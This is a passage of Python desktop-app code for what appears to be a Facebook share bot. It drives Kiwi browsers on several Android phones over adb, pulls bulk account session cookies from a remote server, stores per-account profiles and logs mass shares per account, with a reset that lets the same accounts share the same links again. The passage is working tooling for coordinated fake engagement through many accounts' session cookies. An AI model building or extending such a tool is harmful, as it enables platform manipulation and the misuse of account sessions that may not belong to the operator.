        btn_kiwi_launch.pack(side="left", fill="x", expand=True, padx=(0, 6))
        btn_kiwi_stop = ctk.CTkButton(kiwi_btn_frame, text="🛑 Stop", height=44,
                                      fg_color=COLORS["danger"],
                                      hover_color=COLORS["danger_hover"],
                                      font=FONT_BOLD,
                                      corner_radius=10,
                                      command=self.stop_kiwi_browsers)
        btn_kiwi_stop.pack(side="right", fill="x", expand=True, padx=(6, 0))
        right_panel = ctk.CTkFrame(self.tab_dash, fg_color="transparent")
        right_panel.grid(row=0, column=1, sticky="nsew")
        header_task = ctk.CTkFrame(right_panel, fg_color="transparent")
        header_task.pack(fill="x", padx=8, pady=8)
        header_content = ctk.CTkFrame(header_task, fg_color="transparent")
        header_content.pack(side="left")
        accent_line = ctk.CTkFrame(header_content, fg_color=COLORS["primary"], width=4, height=20, corner_radius=2)
        accent_line.pack(side="left", padx=(0, 10))
        ctk.CTkLabel(header_content, text="📋 Task Queue", font=("Segoe UI", 16, "bold"),
                    text_color=COLORS["text_main"]).pack(side="left")
        ctk.CTkButton(header_task, text="+ Add Link", width=120, height=38,
                      fg_color=COLORS["primary"],
                      hover_color=COLORS["primary_hover"],
                      font=FONT_BOLD,
                      corner_radius=10,
                      command=self.add_pair).pack(side="right")
        self.pairs_scroll = ctk.CTkScrollableFrame(right_panel, fg_color="transparent")
        self.pairs_scroll.pack(fill="both", expand=True, padx=8, pady=8)
        self.add_pair()
    def add_kiwi_entry(self, package_text=""):
        row = ctk.CTkFrame(self.kiwi_entries_container, fg_color="transparent")
        row.pack(fill="x", padx=18, pady=(0, 8))
        entry = ctk.CTkEntry(row, height=38, placeholder_text="Enter Kiwi Package",
                             fg_color=COLORS["bg_main"],
                             border_color=COLORS["border"],
                             border_width=1,
                             corner_radius=10)
        entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
        if package_text:
            entry.insert(0, package_text)
        def remove():
            row.destroy()
            if entry in self.kiwi_entries:
                self.kiwi_entries.remove(entry)
        btn_del = ctk.CTkButton(row, text="✖", width=38, height=38,
                                fg_color=COLORS["bg_lighter"],
                                hover_color=COLORS["danger"],
                                text_color=COLORS["text_sub"],
                                corner_radius=10,
                                font=("Segoe UI", 14, "bold"),
                                command=remove)
        btn_del.pack(side="right")
        self.kiwi_entries.append(entry)
    def launch_kiwi_browsers(self):
        def task():
            self.after(0, lambda: self.status_badge.configure(text="● LAUNCHING KIWI...", text_color=COLORS["warning"]))
            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            try:
                wait_time = float(self.kiwi_delay_entry.get())
            except ValueError:
                wait_time = 8.0  # Default na delay kung may mali sa nilagay
            valid_pkgs = [entry.get().strip() for entry in self.kiwi_entries if entry.get().strip()]
            for i, pkg in enumerate(valid_pkgs):
                cmd = ["adb", "shell", "am", "start", "-a", "android.intent.action.VIEW", "-d",
                       "https://m.facebook.com/", pkg]
                try:
                    subprocess.run(cmd, creationflags=creationflags, capture_output=True)
                    if i < len(valid_pkgs) - 1:
                        time.sleep(wait_time)
                except Exception:
                    pass
            self.after(0, lambda: self.status_badge.configure(text="● IDLE", text_color=COLORS["text_sub"]))
            self.after(0, lambda: messagebox.showinfo("Kiwi Launcher", "Successfully launched Kiwi browsers!"))
        threading.Thread(target=task, daemon=True).start()
    def stop_kiwi_browsers(self):
        def task():
            self.after(0, lambda: self.status_badge.configure(text="● STOPPING KIWI...", text_color=COLORS["danger"]))
            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            for entry in self.kiwi_entries:
                pkg = entry.get().strip()
                if pkg:
                    cmd = ["adb", "shell", "am", "force-stop", pkg]
                    try:
                        subprocess.run(cmd, creationflags=creationflags, capture_output=True)
                    except Exception:
                        pass
            self.after(0, lambda: self.status_badge.configure(text="● IDLE", text_color=COLORS["text_sub"]))
            self.after(0, lambda: messagebox.showinfo("Kiwi Stopped", "Force Stop command sent to all Kiwi browsers."))
        threading.Thread(target=task, daemon=True).start()
    def toggle_saved_profiles_mode(self):
        """Toggle between cookie file mode and saved profiles mode"""
        is_using_saved = self.use_saved_profiles_var.get()
        if is_using_saved:
            self.cookie_entry.configure(state="disabled",
                                       placeholder_text="Using saved profiles instead...")
            self.server_folder_entry.configure(state="disabled")
        else:
            self.cookie_entry.configure(state="normal",
                                       placeholder_text="Select cookies.txt...")
            self.server_folder_entry.configure(state="normal")
    def fetch_from_server(self):
        folder = self.server_folder_entry.get().strip()
        if not folder:
            messagebox.showerror("Error", "Please enter a folder name to fetch from the server.")
            return
        self.status_badge.configure(text="● FETCHING...", text_color=COLORS["warning"])
        self.update()
        def task():
            try:
                url = f"{urlss}?folder={folder}"
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    page = browser.new_page()
                    page.goto(url, wait_until="networkidle", timeout=45000)
                    try:
                        dump_locator = page.locator("#cloud-data-dump")
                        dump_locator.wait_for(state="attached", timeout=15000)
                        b64_data = dump_locator.inner_text()
                    except PlaywrightTimeoutError:
                        raise Exception(
                            "Timeout! Hindi mahanap ang data. Maaaring napakabagal ng connection o mali ang link.")
                    browser.close()
                raw_json = base64.b64decode(b64_data).decode('utf-8')
                cookies = json.loads(raw_json)
                if not cookies:
                    self.after(0,
                               lambda: messagebox.showwarning("Empty", f"No cookie data found in folder '{folder}'."))
                    return
                local_file = f"cloud_data_{folder}.txt"
                with open(local_file, "w", encoding="utf-8") as f:
                    for c in cookies:
                        f.write(c.strip() + "\n")
                self.after(0, lambda: self.cookie_entry.delete(0, "end"))
                self.after(0, lambda: self.cookie_entry.insert(0, local_file))
                self.after(0, lambda: self._count_and_update_cookies(local_file))
                success_msg = f"Successfully synced {len(cookies)} cookies"
                self.after(0, lambda msg=success_msg: messagebox.showinfo("Fetch Success", msg))
            except Exception as e:
                error_msg = f"Browser Fetch Failed:\n{str(e)}\n\nPlease try again."
                self.after(0, lambda msg=error_msg: messagebox.showerror("Connection Error", msg))
            finally:
                self.after(0, lambda: self.status_badge.configure(text="● IDLE", text_color=COLORS["text_sub"]))
        threading.Thread(target=task, daemon=True).start()
    def toggle_gnirehtet_full(self):
        is_on = self.gnirehtet_var.get()
        def task():
            gnirehtet_cmd = "gnirehtet.exe" if os.name == 'nt' else "gnirehtet"
            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            if is_on:
                self.after(0, lambda: self.gnirehtet_toggle.configure(text="🌐 Starting Full Tethering...",
                                                                      state="disabled"))
                if not os.path.exists(gnirehtet_cmd) and shutil.which(gnirehtet_cmd) is None:
                    self.after(0, lambda: messagebox.showerror("Missing Files",
                                                               "GNIREHTET NOT FOUND!\n\nPlease download gnirehtet-rust-win64 and place 'gnirehtet.exe' and 'gnirehtet.apk' in the same folder as main.py."))
                    self.after(0, lambda: self.gnirehtet_var.set(False))
                    self.after(0, lambda: self.gnirehtet_toggle.configure(text="🌐 Full PC Internet via USB (TCP/UDP)",
                                                                          state="normal"))
                    return
                try:
                    if os.name == 'nt':
                        subprocess.run(["taskkill", "/f", "/im", "gnirehtet.exe"], creationflags=creationflags,
                                       capture_output=True)
                    subprocess.run([gnirehtet_cmd, "stop"], creationflags=creationflags, capture_output=True)
                    time.sleep(1.5)
                    subprocess.run([gnirehtet_cmd, "install"], creationflags=creationflags, capture_output=True)
                    self.gnirehtet_process = subprocess.Popen([gnirehtet_cmd, "autorun"], creationflags=creationflags)
                    self.after(0, lambda: self.gnirehtet_toggle.configure(text="🌐 Full USB Internet Active",
                                                                          state="normal"))
                    self.after(0, lambda: messagebox.showinfo("ACTION REQUIRED",
                                                              "Tethering started SILENTLY in the background.\n\n📌 CHECK YOUR PHONES NOW.\nIf a 'Connection Request' or VPN permission pops up, TAP OK OR ACCEPT to allow internet access."))
                except Exception as e:
                    self.after(0, lambda: messagebox.showerror("Error", f"An error occurred:\n{e}"))
                    self.after(0, lambda: self.gnirehtet_var.set(False))
                    self.after(0, lambda: self.gnirehtet_toggle.configure(text="🌐 Full PC Internet via USB (TCP/UDP)",
                                                                          state="normal"))
            else:
                self.after(0, lambda: self.gnirehtet_toggle.configure(text="🌐 Stopping...", state="disabled"))
                try:
                    subprocess.run([gnirehtet_cmd, "stop"], creationflags=creationflags, capture_output=True)
                    if self.gnirehtet_process:
                        self.gnirehtet_process.terminate()
                        self.gnirehtet_process = None
                    if os.name == 'nt':
                        subprocess.run(["taskkill", "/f", "/im", "gnirehtet.exe"], creationflags=creationflags,
                                       capture_output=True)
                except:
                    pass
                self.after(0, lambda: self.gnirehtet_toggle.configure(text="🌐 Full PC Internet via USB (TCP/UDP)",
                                                                      state="normal"))
                self.after(0, lambda: messagebox.showinfo("Disconnected", "Reverse tethering stopped successfully."))
        threading.Thread(target=task, daemon=True).start()
    def toggle_adb_wireless(self):
        is_on = self.adb_wireless_var.get()
        def task():
            creationflags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            try:
                if is_on:
                    self.after(0, lambda: self.adb_toggle.configure(text="📱 Connecting ADB...", state="disabled"))
                    result = subprocess.run(["adb", "devices"], capture_output=True, text=True,
                                            creationflags=creationflags)
                    lines = result.stdout.strip().split('\n')[1:]
                    connected_ips = []
                    for line in lines:
                        if not line.strip(): continue
                        parts = line.split()
                        if len(parts) >= 2 and parts[1] == "device":
                            serial = parts[0]
                            if ":" in serial and "." in serial:
                                continue
                            subprocess.run(["adb", "-s", serial, "tcpip", "5555"], capture_output=True,
                                           creationflags=creationflags)
                            time.sleep(2)
                            ip_result = subprocess.run(["adb", "-s", serial, "shell", "ip", "route"],
                                                       capture_output=True, text=True, creationflags=creationflags)
                            match = re.search(r'src (\d+\.\d+\.\d+\.\d+)', ip_result.stdout)
                            if match:
                                ip = match.group(1)
                                conn_res = subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True,
                                                          text=True, creationflags=creationflags)
                                if "connected" in conn_res.stdout.lower():
                                    connected_ips.append(ip)
                    self.after(0, lambda: self.adb_toggle.configure(text="📱 ADB Wireless Enabled", state="normal"))
                    if connected_ips:
                        msg = "Successfully connected to:\n" + "\n".join(connected_ips)
                        self.after(0, lambda: messagebox.showinfo("ADB Wireless", msg))
                    else:
                        self.after(0, lambda: messagebox.showinfo("ADB Wireless",
                                                                  "No new USB devices found or failed to get IPs.\n(Make sure devices are plugged via USB first)."))
                        self.after(0, lambda: self.adb_wireless_var.set(False))
                        self.after(0, lambda: self.adb_toggle.configure(text="📱 Enable ADB Wireless"))
                else:
                    self.after(0, lambda: self.adb_toggle.configure(text="📱 Disconnecting ADB...", state="disabled"))
                    subprocess.run(["adb", "disconnect"], capture_output=True, creationflags=creationflags)
                    self.after(0, lambda: self.adb_toggle.configure(text="📱 Enable ADB Wireless", state="normal"))
                    self.after(0,
                               lambda: messagebox.showinfo("ADB Wireless", "Disconnected from all wireless devices."))
            except FileNotFoundError:
                self.after(0, lambda: messagebox.showerror("ADB Error",
                                                           "ADB is not installed or not configured correctly.\nCheck the CUSTOM_ADB_PATH at the top of the script."))
                self.after(0, lambda: self.adb_wireless_var.set(False))
                self.after(0, lambda: self.adb_toggle.configure(text="📱 Enable ADB Wireless", state="normal"))
            except Exception as e:
                self.after(0, lambda: messagebox.showerror("Error", f"An error occurred:\n{e}"))
                self.after(0, lambda: self.adb_wireless_var.set(False))
                self.after(0, lambda: self.adb_toggle.configure(text="📱 Enable ADB Wireless", state="normal"))
        threading.Thread(target=task, daemon=True).start()
    def clear_share_history(self):
        ans = messagebox.askyesno("Clear History",
                                  "Clear share history? This will allow processed accounts to share the same links again.")
        if ans:
            with self.history_lock:
                self.share_history = {}
                try:
                    if os.path.exists(self.history_file):
                        os.remove(self.history_file)
                except Exception as e:
                    pass
            messagebox.showinfo("Success", "Share history cleared successfully!")
    def setup_logs(self):
        self.tab_logs.grid_columnconfigure(0, weight=1)
        self.tab_logs.grid_rowconfigure(2, weight=1)
        top_bar = ctk.CTkFrame(self.tab_logs, fg_color="transparent", height=45)
        top_bar.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 5))
        ctk.CTkLabel(top_bar, text="LIVE LOGS", font=FONT_SUBHEADER, text_color=COLORS["text_sub"]).pack(side="left",
                                                                                                         padx=(0, 20))
        self.log_shares_label = ctk.CTkLabel(top_bar, text="✅ SHARES: 0", font=FONT_BOLD, text_color=COLORS["success"])
        self.log_shares_label.pack(side="left", padx=(0, 15))
        self.log_failed_label = ctk.CTkLabel(top_bar, text="⚠️ FAILED: 0", font=FONT_BOLD, text_color=COLORS["warning"])
        self.log_failed_label.pack(side="left", padx=(0, 15))
        self.log_expired_label = ctk.CTkLabel(top_bar, text="❌ EXPIRED: 0", font=FONT_BOLD, text_color=COLORS["danger"])
        self.log_expired_label.pack(side="left", padx=(0, 15))
        self.log_cookies_label = ctk.CTkLabel(top_bar, text="🍪 COOKIES: 0", font=FONT_BOLD,
                                              text_color=COLORS["primary"])
        self.log_cookies_label.pack(side="left", padx=(0, 15))
        self.logs_stop_btn = ctk.CTkButton(top_bar, text="⏹ STOP", width=90, height=32, fg_color=COLORS["danger"],
                                           hover_color="#BE123C", font=FONT_BOLD, state="disabled", corner_radius=6,
                                           command=self.stop_automation)
        self.logs_stop_btn.pack(side="right", padx=(0, 5))
        ctk.CTkButton(top_bar, text="🗑 Clear", width=90, height=32, fg_color="transparent", border_width=1,
                      border_color=COLORS["border"], hover_color=COLORS["bg_lighter"], corner_radius=6,
                      command=self.clear_logs).pack(side="right", padx=(0, 10))
        progress_frame = ctk.CTkFrame(self.tab_logs, fg_color="transparent")
        progress_frame.grid(row=1, column=0, sticky="ew", padx=10, pady=(5, 10))
        self.progress_label = ctk.CTkLabel(progress_frame, text="Progress: 0 / 0 Accounts", font=FONT_BODY,
                                           text_color=COLORS["text_sub"])
        self.progress_label.pack(side="left", padx=(0, 15))
        self.progress_bar = ctk.CTkProgressBar(progress_frame, fg_color=COLORS["bg_card"],
                                               progress_color=COLORS["primary"], height=10, corner_radius=5)
        self.progress_bar.pack(side="left", fill="x", expand=True)
        self.progress_bar.set(0)
        logs_container = ctk.CTkFrame(self.tab_logs, fg_color=COLORS["bg_main"], corner_radius=12, border_width=1,
                                      border_color=COLORS["border"])
        logs_container.grid(row=2, column=0, sticky="nsew", padx=5, pady=5)
        logs_container.grid_columnconfigure(0, weight=1)
        logs_container.grid_rowconfigure(0, weight=1)
        style = ttk.Style()
        style.theme_use("default")
        style.configure("Treeview",
                        background=COLORS["bg_main"],
                        foreground=COLORS["text_main"],
                        fieldbackground=COLORS["bg_main"],
                        borderwidth=0,
                        rowheight=35,
                        font=("Roboto", 11))
        style.map('Treeview', background=[('selected', COLORS["bg_lighter"])])
        style.configure("Treeview.Heading",
                        background=COLORS["bg_card"],
                        foreground=COLORS["text_sub"],
                        font=("Roboto", 11, "bold"),
                        borderwidth=0,
                        padding=(0, 10))
        tree_f1 = ctk.CTkFrame(logs_container, corner_radius=12, fg_color="transparent")
        tree_f1.pack(fill="both", expand=True, padx=2, pady=2)
        cols1 = ("Time", "Worker", "Link", "Caption", "Status")
        self.table_auto = ttk.Treeview(tree_f1, columns=cols1, show="headings", height=8)
        self.table_auto.heading("Time", text="TIME", anchor="center")
        self.table_auto.column("Time", width=120, anchor="center")
        self.table_auto.heading("Worker", text="WORKER", anchor="center")
        self.table_auto.column("Worker", width=100, anchor="center")
        self.table_auto.heading("Link", text="LINK", anchor="center")
        self.table_auto.column("Link", width=250, anchor="center")
        self.table_auto.heading("Caption", text="CAPTION", anchor="center")
        self.table_auto.column("Caption", width=250, anchor="center")
        self.table_auto.heading("Status", text="STATUS", anchor="center")
        self.table_auto.column("Status", width=300, anchor="center")
        sb1 = ctk.CTkScrollbar(tree_f1, command=self.table_auto.yview)
        self.table_auto.configure(yscrollcommand=sb1.set)
        sb1.pack(side="right", fill="y", pady=5)
        self.table_auto.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        self.table_auto.tag_configure("SUCCESS", foreground=COLORS["success"])
        self.table_auto.tag_configure("ERROR", foreground=COLORS["danger"])
        self.table_auto.tag_configure("WARN", foreground=COLORS["warning"])
        self.table_auto.tag_configure("INFO", foreground=COLORS["primary"])
        self.table_auto.bind("<Double-1>", self.on_log_double_click)
    def setup_expired_cookies(self):
        self.tab_expired.grid_columnconfigure(0, weight=1)
        self.tab_expired.grid_rowconfigure(1, weight=1)
        header_card = ctk.CTkFrame(self.tab_expired, fg_color=COLORS["bg_card"], corner_radius=12, border_width=1,
                                   border_color=COLORS["border"])
        header_card.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 5))
        title_frame = ctk.CTkFrame(header_card, fg_color="transparent")
        title_frame.pack(side="left", padx=20, pady=15)
        ctk.CTkLabel(title_frame, text="❌", font=("Segoe UI Emoji", 24)).pack(side="left", padx=(0, 10))
        text_frame = ctk.CTkFrame(title_frame, fg_color="transparent")
        text_frame.pack(side="left")
        ctk.CTkLabel(text_frame, text="EXPIRED ACCOUNTS", font=FONT_SUBHEADER, text_color=COLORS["danger"]).pack(
            anchor="w")
        self.lbl_total_expired_tab = ctk.CTkLabel(text_frame, text="Total Detected: 0", font=FONT_BODY,
                                                  text_color=COLORS["text_sub"])
        self.lbl_total_expired_tab.pack(anchor="w")
        btn_frame = ctk.CTkFrame(header_card, fg_color="transparent")
        btn_frame.pack(side="right", padx=20, pady=15)
        ctk.CTkButton(btn_frame, text="🗑 Clear All", width=100, height=36, fg_color="transparent", border_width=1,
                      border_color=COLORS["danger"], text_color=COLORS["danger"], hover_color="#BE123C",
                      corner_radius=6, command=self.clear_expired).pack(side="right", padx=(10, 0))
        ctk.CTkButton(btn_frame, text="📋 Copy All", width=100, height=36, fg_color=COLORS["success"],
                      hover_color="#047857", font=FONT_BOLD, corner_radius=6, command=self.copy_all_expired).pack(
            side="right", padx=(10, 0))
        ctk.CTkButton(btn_frame, text="📋 Copy Selected", width=130, height=36, fg_color=COLORS["primary"],
                      hover_color=COLORS["primary_hover"], font=FONT_BOLD, corner_radius=6,
                      command=self.copy_selected_expired).pack(side="right", padx=(0, 0))
        tree_frame = ctk.CTkFrame(self.tab_expired, corner_radius=12, fg_color=COLORS["bg_main"], border_width=1,
                                  border_color=COLORS["border"])
        tree_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=(5, 10))
        tree_frame.grid_columnconfigure(0, weight=1)
        tree_frame.grid_rowconfigure(0, weight=1)
        cols = ("No", "Profile Link")
        self.table_expired = ttk.Treeview(tree_frame, columns=cols, show="headings", height=15)
        self.table_expired.heading("No", text="NO.", anchor="center")
        self.table_expired.column("No", width=80, anchor="center", stretch=False)
        self.table_expired.heading("Profile Link", text="PROFILE LINK (Double click to open)", anchor="w")
        self.table_expired.column("Profile Link", width=800, anchor="w")
        sb = ctk.CTkScrollbar(tree_frame, command=self.table_expired.yview)
        self.table_expired.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y", pady=10, padx=(0, 10))
        self.table_expired.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        self.table_expired.bind("<Double-1>", self.on_expired_double_click)
    def add_expired_to_tree(self, link):
        idx = len(self.table_expired.get_children()) + 1
        self.table_expired.insert("", "end", values=(idx, link))
        self.lbl_total_expired_tab.configure(text=f"Total Detected: {idx}")
    def clear_expired(self):
        ans = messagebox.askyesno("Clear List",
                                  "Clear the expired accounts list?\n\n(The system will re-detect these accounts on the next run.)")
        if ans:
            for item in self.table_expired.get_children():
                self.table_expired.delete(item)
            with self.stats_lock:
                self.expired_accounts.clear()
                self.expired_count = 0
            self.lbl_total_expired_tab.configure(text="Total Detected: 0")
            self.update_stats()
    def copy_selected_expired(self):
        selected = self.table_expired.selection()
        if not selected:
            messagebox.showinfo("Info", "Please select a row first.")
            return
        link = self.table_expired.item(selected[0])['values'][1]
        self.clipboard_clear()
        self.clipboard_append(link)
        self.update()
    def copy_all_expired(self):
        items = self.table_expired.get_children()
        if not items:
            messagebox.showinfo("Info", "List is empty.")
            return
        links = [self.table_expired.item(i)['values'][1] for i in items]
        self.clipboard_clear()
        self.clipboard_append("\n".join(links))
        self.update()
        messagebox.showinfo("Copied", f"Copied {len(links)} links to clipboard!")
    def on_expired_double_click(self, event):
        try:
            item = self.table_expired.selection()[0]
            url = self.table_expired.item(item)['values'][1]
            if "http" in url:
                webbrowser.open(url)
        except Exception:
            pass
    def setup_saved_profiles(self):
        self.tab_saved.grid_columnconfigure(0, weight=1)
        self.tab_saved.grid_rowconfigure(1, weight=1)
        top_bar = ctk.CTkFrame(self.tab_saved, fg_color="transparent", height=45)
        top_bar.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 5))
        ctk.CTkLabel(top_bar, text="📁 SAVED SESSIONS", font=FONT_SUBHEADER, text_color=COLORS["text_main"]).pack(
            side="left", padx=(0, 10))
        self.lbl_total_saved = ctk.CTkLabel(top_bar, text="Total: 0", font=FONT_BOLD, text_color=COLORS["primary"])
        self.lbl_total_saved.pack(side="left", padx=(10, 0))
        ctk.CTkButton(top_bar, text="🔄 Refresh", width=100, height=36, corner_radius=6, fg_color=COLORS["bg_lighter"],
                      hover_color=COLORS["border"], border_width=1, border_color=COLORS["border"],
                      text_color=COLORS["text_main"], command=self.populate_saved_profiles).pack(side="right",
                                                                                                 padx=(0, 5))
        ctk.CTkButton(top_bar, text="🗑 Delete All", width=100, height=36, fg_color=COLORS["danger"],
                      hover_color="#BE123C", font=FONT_BOLD, corner_radius=6, command=self.delete_all_profiles).pack(
            side="right", padx=(0, 10))
        ctk.CTkButton(top_bar, text="📋 Copy All", width=100, height=36, fg_color=COLORS["success"],
                      hover_color="#047857", font=FONT_BOLD, corner_radius=6, command=self.copy_all_profiles).pack(
            side="right", padx=(0, 10))
        self.profiles_scroll = ctk.CTkScrollableFrame(self.tab_saved, fg_color="transparent")
        self.profiles_scroll.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        self.populate_saved_profiles()
    def populate_saved_profiles(self):
        for widget in self.profiles_scroll.winfo_children():
            widget.destroy()
        profiles_dir = os.path.join(os.getcwd(), "profiles")
        count = 0
        if os.path.exists(profiles_dir):
            uids = [d for d in os.listdir(profiles_dir) if os.path.isdir(os.path.join(profiles_dir, d))]
            count = len(uids)
            if not uids:
                ctk.CTkLabel(self.profiles_scroll, text="No saved profiles or cookies yet.", font=FONT_BODY,
                             text_color=COLORS["text_sub"]).pack(pady=40)
            else:
                for i, uid in enumerate(uids):
                    self.create_profile_row(i + 1, uid)
        else:
            ctk.CTkLabel(self.profiles_scroll, text="No saved profiles or cookies yet.", font=FONT_BODY,
                         text_color=COLORS["text_sub"]).pack(pady=40)
        if hasattr(self, 'lbl_total_saved'):
            self.lbl_total_saved.configure(text=f"Total: {count}")
    def create_profile_row(self, index, uid):
        row = ctk.CTkFrame(self.profiles_scroll, fg_color=COLORS["bg_card"], corner_radius=10, border_width=1,
                           border_color=COLORS["border"])
        row.pack(fill="x", pady=6, padx=5)
        lbl_idx = ctk.CTkLabel(row, text=f"{index}.", width=40, font=FONT_BOLD, text_color=COLORS["text_sub"])
        lbl_idx.pack(side="left", padx=(10, 5), pady=12)
        fb_link = f"https://www.facebook.com/{uid}"
        lbl_link = ctk.CTkLabel(row, text=fb_link, font=("Roboto", 13, "underline"), text_color=COLORS["primary"],
                                cursor="hand2")
        lbl_link.pack(side="left", padx=10, pady=12)
        lbl_link.bind("<Double-1>", lambda e, url=fb_link: webbrowser.open(url))
        btn_copy = ctk.CTkButton(row, text="📋 Copy", width=80, height=30, fg_color=COLORS["bg_lighter"],
                                 hover_color=COLORS["primary"], corner_radius=6, text_color=COLORS["text_main"],
                                 command=lambda u=fb_link: self.copy_to_clipboard(u))
        btn_copy.pack(side="right", padx=(5, 15), pady=12)
        btn_del = ctk.CTkButton(row, text="🗑 Delete", width=80, height=30, fg_color="transparent", border_width=1,
                                border_color=COLORS["danger"], text_color=COLORS["danger"],
                                hover_color=COLORS["danger"], corner_radius=6,
                                command=lambda r=row, u=uid: self.delete_profile(r, u))
        btn_del.pack(side="right", padx=5, pady=12)
    def copy_to_clipboard(self, text):
        self.clipboard_clear()
        self.clipboard_append(text)
        self.update()
    def copy_all_profiles(self):
        profiles_dir = os.path.join(os.getcwd(), "profiles")
        if not os.path.exists(profiles_dir):
            return
        uids = [d for d in os.listdir(profiles_dir) if os.path.isdir(os.path.join(profiles_dir, d))]
        if not uids:
            return
        links = [f"https://www.facebook.com/{uid}" for uid in uids]
        self.clipboard_clear()
        self.clipboard_append("\n".join(links))
        self.update()
        messagebox.showinfo("Copied", f"Copied {len(links)} links to clipboard!")
    def delete_profile(self, row_widget, uid):
        prof_path = os.path.join(os.getcwd(), "profiles", uid)
        try:
            if os.path.exists(prof_path):
                shutil.rmtree(prof_path)
            row_widget.destroy()
            self.overall_stats.update_cookies(max(0, int(self.overall_stats.card_cookies.value_var.get()) - 1))
            current_count = int(self.lbl_total_saved.cget("text").split(": ")[1])
            self.lbl_total_saved.configure(text=f"Total: {max(0, current_count - 1)}")
        except Exception as e:
            messagebox.showerror("Error", f"Cannot delete folder:\n{e}")
    def delete_all_profiles(self):
        response = messagebox.askyesno("Delete All", "Delete ALL saved profiles?")
        if response:
            profiles_dir = os.path.join(os.getcwd(), "profiles")
            if os.path.exists(profiles_dir):
                try:
                    shutil.rmtree(profiles_dir)
                    os.makedirs(profiles_dir, exist_ok=True)
                except Exception as e:
                    pass
            self.populate_saved_profiles()
            self.overall_stats.update_cookies(0)
    def update_progress_ui(self, processed, total):
        if total > 0:
            val = processed / total
            self.progress_bar.set(val)
            self.progress_label.configure(text=f"Progress: {processed} / {total} Accounts")
        else:
            self.progress_bar.set(0)
            self.progress_label.configure(text="Progress: 0 / 0 Accounts")
    def log_row(self, worker_id, link, caption, status, level="INFO"):
        ts = datetime.now().strftime("%I:%M:%S %p")
        d_name = worker_id
        disp_link = (link[:40] + '...') if len(link) > 40 else link
        disp_cap = (caption[:40] + '...') if caption and len(caption) > 40 else caption
        if not disp_cap: disp_cap = "---"
        self.after(10, lambda: self._safe_insert(self.table_auto, (ts, d_name, disp_link, disp_cap, status), level,
                                                 full_link=link))
    def _safe_insert(self, tree, values, tag, full_link=""):
        try:
            tree.insert("", "end", text=full_link, values=values, tags=(tag,))
            children = tree.get_children()
            if len(children) > 100:
                tree.delete(children[0])
            tree.yview_moveto(1)
        except Exception as e:
            pass
    def clear_logs(self):
        for item in self.table_auto.get_children():
            self.table_auto.delete(item)
    def on_log_double_click(self, event):
        try:
            tree = event.widget
            item = tree.item(tree.identify_row(event.y))
            url = item.get('text', '')
            if not url:
                url = item['values'][2]
            if "http" in url:
                webbrowser.open(url)
        except Exception as e:
            pass
    def setup(self):
        Dars = False
        self.tab_settings.grid_columnconfigure(0, weight=1)
        self.tab_settings.grid_rowconfigure(0, weight=1)
        settings_scroll = ctk.CTkScrollableFrame(self.tab_settings, fg_color="transparent")
        settings_scroll.grid(row=0, column=0, sticky="nsew", padx=25, pady=25)
        header_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"],
                                   corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        header_card.pack(fill="x", pady=(0, 25))
        header_content = ctk.CTkFrame(header_card, fg_color="transparent")
        header_content.pack(fill="x", padx=30, pady=25)
        icon_frame = ctk.CTkFrame(header_content, fg_color=COLORS["primary_bg"],
                                  corner_radius=14, width=56, height=56,
                                  border_width=2, border_color=COLORS["primary"])
        icon_frame.pack(side="left", padx=(0, 20))
        icon_frame.pack_propagate(False)
        ctk.CTkLabel(icon_frame, text="⚙️", font=("Segoe UI Emoji", 28)).pack(expand=True)
        title_container = ctk.CTkFrame(header_content, fg_color="transparent")
        title_container.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(title_container, text="Advanced Settings",
                    font=("Segoe UI", 22, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(title_container, text="Configure automation behavior and preferences",
                    font=("Segoe UI", 11),
                    text_color=COLORS["text_muted"]).pack(anchor="w", pady=(5, 0))
        after_shares_card = ctk.CTkFrame(settings_scroll, fg_color=COLORS["bg_elevated"],
                                        corner_radius=20, border_width=1, border_color=COLORS["border_light"])
        after_shares_card.pack(fill="x", pady=(0, 20))
        section_header = ctk.CTkFrame(after_shares_card, fg_color=COLORS["bg_card"], corner_radius=18)
        section_header.pack(fill="x", padx=3, pady=3)
        header_inner = ctk.CTkFrame(section_header, fg_color="transparent")
        header_inner.pack(fill="x", padx=25, pady=18)
        accent_bar = ctk.CTkFrame(header_inner, fg_color=COLORS["success"], width=5, height=24, corner_radius=3)
        accent_bar.pack(side="left", padx=(0, 12))
        header_text = ctk.CTkFrame(header_inner, fg_color="transparent")
        header_text.pack(side="left")
        ctk.CTkLabel(header_text, text="🌐 Browser Behavior",
                    font=("Segoe UI", 15, "bold"),
                    text_color=COLORS["text_main"]).pack(anchor="w")
        ctk.CTkLabel(header_text, text="Control what happens after sharing",
                    font=("Segoe UI", 10),
                    text_color=COLORS["text_muted"]).pack(anchor="w")
        content_frame = ctk.CTkFrame(after_shares_card, fg_color="transparent")
        content_frame.pack(fill="x", padx=25, pady=(15, 25))
        close_browser_frame = ctk.CTkFrame(content_frame, fg_color=COLORS["bg_card"],
                                          corner_radius=14, border_width=1, border_color=COLORS["border"])
        close_browser_frame.pack(fill="x", pady=(0, 15))
        close_browser_inner = ctk.CTkFrame(close_browser_frame, fg_color="transparent")
        close_browser_inner.pack(fill="x", padx=20, pady=16)
        left_content = ctk.CTkFrame(close_browser_inner, fg_color="transparent")
        left_content.pack(side="left", fill="x", expand=True)
        icon_text_row = ctk.CTkFrame(left_content, fg_color="transparent")
        icon_text_row.pack(anchor="w")
        ctk.CTkLabel(icon_text_row, text="🔒", font=("Segoe UI Emoji", 18)).pack(side="left", padx=(0, 10))
